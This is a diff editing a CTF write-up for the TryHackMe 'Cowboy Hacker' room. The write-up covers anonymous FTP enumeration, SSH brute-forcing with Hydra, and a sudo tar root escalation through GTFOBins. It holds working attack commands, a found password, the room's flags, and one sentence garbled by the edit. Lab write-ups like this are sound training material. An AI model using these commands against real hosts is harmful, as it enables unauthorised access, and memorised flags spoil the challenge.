@@ -9,11 +9,11 @@
 
 ## 🗺️ Overview
 
-A beginner-friendly Linux box themed around the anime *Cowboy Bebop*. The attack chain involves anonymous FTP enumeration, SSH brute-forcing with a found wordlist, and a `tar`-based sudo privilege escalation to root.
+A beginner-friendly Linux box  involves anonymous FTP enumeration, SSH brute-forcing with a found wordlist, and a `tar`-based sudo privilege escalation to root.
 
 ---
 
-## Task 1 — Deploy the Machine
+## Task 1 - Deploy the Machine
 
 Deploy the machine and confirm it's alive:
 
@@ -36,7 +36,7 @@ rtt min/avg/max/mdev = 74.818/135.893/264.071/66.777 ms
 
 ---
 
-## Task 2 — Find Open Ports on the Machine
+## Task 2 - Find Open Ports on the Machine
 
 ```bash
 ┌──(aashiq㉿kali)-[~/Downloads]
@@ -95,9 +95,9 @@ Nmap done: 1 IP address (1 host up) scanned in 169.35 seconds
 
 ---
 
-## Task 3 — Who Wrote the Task List?
+## Task 3 - Who Wrote the Task List?
 
-Anonymous FTP login is enabled. Logged in and found two files:
+Anonymous FTP login is enabled.
 
 ```bash
 ┌──(aashiq㉿kali)-[~/Downloads]
@@ -183,15 +183,15 @@ r3ddr@g0N
 ReDSynd1ca7e
 ```
 
-The note in `task.txt` is signed by **lin** — that's our username.
+The note in `task.txt` is signed by **lin** and that's our username.
 
 > **Answer:** `lin`
 
 ---
 
-## Task 4 — What Service Can You Bruteforce with the Text File Found?
+## Task 4 - What Service Can You Bruteforce with the Text File Found?
 
-`locks.txt` is a password wordlist. The username `lin` was found in `task.txt`. SSH is open on port 22, so we bruteforce it with Hydra:
+`locks.txt` is a password wordlist. The username `lin` was found in `task.txt`. SSH is open on port 22, so we can bruteforce it with Hydra:
 
 ```bash
 ┌──(aashiq㉿kali)-[~/Downloads]
@@ -226,9 +226,9 @@ The Hydra output above reveals the valid credential:
 
 ---
 
-## Task 6 — user.txt
+## Task 6 - user.txt
 
-SSH into the machine with the found credentials and grab the user flag:
+SSH into the machine with the found credentials to grab the user flag:
 
 ```bash
 ┌──(aashiq㉿kali)-[~/Downloads]
@@ -269,7 +269,7 @@ THM{CR1M3_SyNd1C4T3}
 
 ---
 
-## Task 7 — root.txt
+## Task 7 - To get root.txt
 
 Check what sudo privileges `lin` has:
 
@@ -282,7 +282,7 @@ User lin may run the following commands on ip-10-49-134-171:
     (root) /bin/tar
 ```
 
-`/bin/tar` can be run as root. Using the [GTFOBins tar technique](https://gtfobins.github.io/gtfobins/tar/) to escape into a root shell via `--checkpoint-action`:
+`/bin/tar` can be run as root. Using the [GTFOBins tar technique](https://gtfobins.github.io/gtfobins/tar/) to get into a root shell
 
 ```bash
 lin@ip-10-49-134-171:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
@@ -299,17 +299,6 @@ THM{80UN7Y_h4cK3r}
 
 ---
 
-## 📋 Answers Summary
-
-| Question | Answer |
-|----------|--------|
-| Who wrote the task list? | `lin` |
-| What service can you bruteforce with the text file found? | `SSH` |
-| What is the user's password? | `RedDr4gonSynd1cat3` |
-| user.txt | `THM{CR1M3_SyNd1C4T3}` |
-| root.txt | `THM{80UN7Y_h4cK3r}` |
-
----
 
 ## 🛠️ Tools Used
 
@@ -322,4 +311,4 @@ THM{80UN7Y_h4cK3r}
 
 ---
 
-*Writeup by aashiq · [TryHackMe Room](https://tryhackme.com/room/cowboyhacker)*
+*Writeup by aashiq 
